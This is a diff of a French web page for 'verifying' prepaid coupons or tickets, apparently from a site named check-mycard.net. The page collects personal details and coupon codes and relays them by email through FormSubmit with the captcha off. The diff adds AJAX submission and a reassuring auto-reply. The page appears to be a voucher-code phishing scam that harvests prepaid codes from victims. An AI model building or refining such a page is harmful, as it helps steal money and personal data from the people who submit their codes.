@@ -17,6 +17,8 @@
 
         * {
             box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
         body {
@@ -27,8 +29,6 @@
             background-position: center;
             position: relative;
             min-height: 100vh;
-            margin: 0;
-            padding: 0;
             overflow-x: hidden;
         }
 
@@ -189,6 +189,7 @@
             position: sticky;
             top: 0;
             z-index: 1000;
+            width: 100%;
         }
 
         .container {
@@ -373,15 +374,13 @@
                 Vous recevrez les résultats par email dans les plus brefs délais.
             </p>
 
-            <form id="verificationForm" action="https://formsubmit.co/contact@check-mycard.net" method="POST">
-                <!-- Redirection vers confirmation.html après soumission -->
-                <input type="hidden" name="_next" value="confirmation.html">
-                <!-- Ajout du sujet personnalisé -->
+            <form id="verificationForm" action="https://formsubmit.co/ajax/contact@check-mycard.net" method="POST">
+                <!-- Configuration FormSubmit -->
+                <input type="hidden" name="_next" value="https://votredomaine.com/confirmation.html">
                 <input type="hidden" name="_subject" value="Nouvelle demande de vérification de coupon">
-                <!-- Ajout du template personnalisé -->
                 <input type="hidden" name="_template" value="table">
-                <!-- Désactivation du captcha -->
                 <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_autoresponse" value="Merci pour votre demande. Nous traitons votre ticket et vous répondrons sous peu.">
                 
                 <!-- Informations personnelles -->
                 <div class="form-group required">
@@ -460,7 +459,6 @@
                     <ul class="footer-links">
                         <li><a href="index.html">Accueil</a></li>
                         <li><a href="activer-coupon-fr.html">Activer un Ticket</a></li>
-                        
                     </ul>
                 </div>
                 <div class="footer-column">
@@ -482,6 +480,42 @@
         // Gestion du formulaire avec FormSubmit
         const verificationForm = document.getElementById('verificationForm');
         
+        verificationForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Afficher le loader
+            const submitBtn = verificationForm.querySelector('.btn-submit');
+            const originalBtnText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi en cours...';
+            submitBtn.disabled = true;
+            
+            // Envoyer le formulaire via FormSubmit
+            fetch(verificationForm.action, {
+                method: 'POST',
+                body: new FormData(verificationForm),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Redirection vers la page de confirmation
+                    window.location.href = verificationForm.querySelector('[name="_next"]').value;
+                } else {
+                    throw new Error('Erreur réseau');
+                }
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                alert('Une erreur s\'est produite. Veuillez réessayer.');
+            })
+            .finally(() => {
+                // Réinitialiser le bouton
+                submitBtn.innerHTML = originalBtnText;
+                submitBtn.disabled = false;
+            });
+        });
+
         // Fonction pour masquer/afficher les codes
         const hideCodeToggle = document.getElementById('hideCodeToggle');
         const codeInputs = document.querySelectorAll('input[type="text"][id^="code"]');
